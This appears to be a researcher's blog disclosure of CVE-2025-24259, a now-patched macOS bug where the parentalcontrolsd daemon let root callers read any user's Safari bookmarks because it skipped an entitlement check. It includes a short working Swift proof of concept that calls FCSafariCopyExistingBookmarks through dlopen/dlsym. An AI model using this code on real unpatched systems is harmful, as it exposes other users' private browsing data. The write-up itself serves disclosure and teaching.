    <h2>A Quick Summary</h2>
    <p>Happy Monday! You should probably update your Macs now. <a href="https://support.apple.com/en-us/122375">macOS Ventura 13.7.5</a>, <a href="https://support.apple.com/en-us/122374">macOS Sonoma 14.7.5</a>, and <a href="https://support.apple.com/en-us/122373">macOS Sequoia 15.4</a>, are out. They include a lot of patches, with 15.4 including patches for <a href="https://x.com/ClassicII_MrMac/status/1906782483942666496">131 CVE's.</a> If you're curious and want to validate that, just open the security release notes for that update and search for the string <q>CVE-202</q>. You'll find 131 matches on that page as of writing.</p>
    <p>One of those CVE's, <b>CVE-2025-24259</b>, allowed root processes to leak the Safari bookmarks for any user.</p>
    <h2>A Brief Recap</h2>
    <p>For those of you who didn't read <a href="/posts/password-leak/">my last write-up</a>, here is the basic gist:</p>
    <ol>
      <li>Processes on macOS communicate with each other via <b>Mach messages</b>.</li>
      <li><b>MIG (the Mach Interface Generator)</b> can generate code for <abbr title="remote procedure call">RPC</abbr>-style API's around Mach messages.</li>
      <li>Process executables can be signed with key-value pairs called <b><a href="https://developer.apple.com/documentation/bundleresources/entitlements">entitlements.</a></b></li>
      <li>A kernel module called <abbr title="Apple Mobile File Integrity">AMFI</abbr> scans the entitlements of <em>every</em> process launched and immediately kills those that are signed with <q>restricted entitlements</q> they lack the proper <b>provisioning profile</b> for.</li>
      <li>Any process that is running on a macOS device must have made it past that kernel module, and therefore it can be assumed that its entitlements dictionary can be trusted.</li>
      <li>A Mach message include a kernel-appended trailer, which contains (among other things) an <b>audit token</b> that can be used by the receiver to uniquely identify the sending process and read its entitlements.</li>
      <li>Mach messages receivers <em>should</em> utilize this, and ignore messages from un-entitled senders.</li>
      <li><strong>Some receivers don't do this.</strong></li>
    </ol>
    <h2>On MIG Client Code</h2>
    <p>As I explained in my previous write-up, Mach message senders are usually called <b>clients</b>, which Mach message receivers are usually called <b>servers</b>. Take a look at that write-up if you are curious as to why this is the case. Anyway, as mentioned above, MIG can generate code for functional interfaces around Mach messages. In my previous write-up, I mimicked client code to send Mach messages to a daemon that didn't check entitlements, allowing me to access restricted resources. This write-up is more of the same, but we're going to save some time by not writing the client code ourselves.</p>
    <h2>The Parental/Family Controls Daemon</h2>
    <p>The <q>parental controls</q> daemon is a MIG daemon on macOS that lives at:</p>
    <pre><code>/System/Library/PrivateFrameworks/FamilyControls.framework/Resources/parentalcontrolsd</code></pre>
    <p>The daemon itself, of course, contains the MIG server code. The MIG client code lives inside the <code>FamilyControls</code> framework it is contained in. This is a fairly common pattern I have seen with daemons, and having existing client code can be very helpful for security research. Sure, we could re-create the client code in our <abbr title="proof-of-concept">PoC</abbr>, but sometimes it's much simpler to just use the already-existing client code.</p>
    <h2>Proof-Of-Concept</h2>
    <p>While my <b><a href="https://www.github.com/nmggithub/Kass">Kass</a></b> tooling I used in my previous write-up <em>does</em> include <a href="https://swiftpackageindex.com/nmggithub/Kass/v4.2.1/documentation/linking">a nice wrapper around dynamic linking,</a> it's not strictly necessary. We can use the standard <code>dlopen</code>/<code>dlsym</code> calls to bring in the MIG client code from the <code>FamilyControls</code> framework and call it. It really doesn't take that many lines of Swift:</p>
    <pre><code>import Foundation

if getuid() != 0 {
    print("This program should be run as root.")
    exit(1)
}

if CommandLine.argc != 2 { 
    print("Usage: \(String(cString: getprogname()!, encoding: .utf8)!) &lt;username&gt;")
    exit(1)
}

let fFamilyControls =
    dlopen("/System/Library/PrivateFrameworks/FamilyControls.framework/FamilyControls", RTLD_LAZY)!
let FCSafariCopyExistingBookmarks
    = unsafeBitCast(
        dlsym(fFamilyControls, "FCSafariCopyExistingBookmarks"),
        to: (@convention(c) (String, Data) -> AnyObject?).self
    )
print(FCSafariCopyExistingBookmarks(CommandLine.arguments[1], Data()) as AnyObject)</code></pre>
    <p>Compiling the above code with <code>swiftc</code> and running the resulting executable as root would print out the Safari bookmarks of the specified user. I only tested against a single user in my tests, but I don't see why this would not work for all users on the device (especially as it is the daemon itself that is accessing the bookmarks, and it should have read-access to them all, regardless of the user).</p>
    <p>For those wondering, the second argument of <code>FCSafariCopyExistingBookmarks</code> takes in a <code><a href="https://developer.apple.com/documentation/foundation/data">Data</a></code> object representing the bytes of an <code><a href="https://developer.apple.com/documentation/security/authorizationexternalform">AuthorizationExternalForm</a></code>, which could be used to authorize the copying of the bookmarks. However, in the absence of a valid authorization object, <code>parentalcontrolsd</code> would still allow root callers to copy the bookmarks, so we pass an empty <code>Data</code> object.</p>
    <h2>Apple's Solution</h2>
    <p>Apple's solution here was, again, adding an entitlement check. Now, <code>parentalcontrolsd</code> will ignore clients that don't have the <code>com.apple.private.parentalcontrols</code> entitlement key with a boolean value of <code>true</code> when they try to call that specific MIG routine to copy Safari bookmarks.</p>
    <h2>Conclusion</h2>
    <p>This, again, underscores the importance of validating senders before acting on Mach messages. Like my last write-up, this was a simple vulnerability with a simple solution, and I'm glad it's patched.</p>
    <p>As always... <a target="_self" href="/feed.xml">watch this space.</a></p>
